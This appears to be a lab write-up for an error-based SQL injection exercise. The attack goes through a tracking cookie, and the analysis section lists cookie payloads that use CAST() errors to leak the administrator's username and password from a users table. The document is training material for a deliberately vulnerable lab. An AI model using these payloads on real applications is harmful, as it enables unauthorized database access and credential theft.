This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. 
The results of the SQL query are not returned.

The database contains a different table called users, with columns called username and password. To solve the lab, find a way to leak the password for the administrator user, 
then log in to their account. 

End Goal:
- Exploit SQLi to retrieve the admin users credentials from the users table
- Log into their account

Analysis:
---------

select trackingId from trackingIdTable where trackingId='dslkhdkjshdkj''

select * from tracking where id='dslkhdkjshdkj'--'

CAST()

dslkhdkjshdkj' AND CAST((SELECT 1) as int)--

dslkhdkjshdkj' AND 1=CAST((SELECT username from users) as int)--

(Empty)' AND 1=CAST((SELECT username from users LIMIT 1) as int)--

(Empty)' AND 1=CAST((SELECT password from users LIMIT 1) as int)--
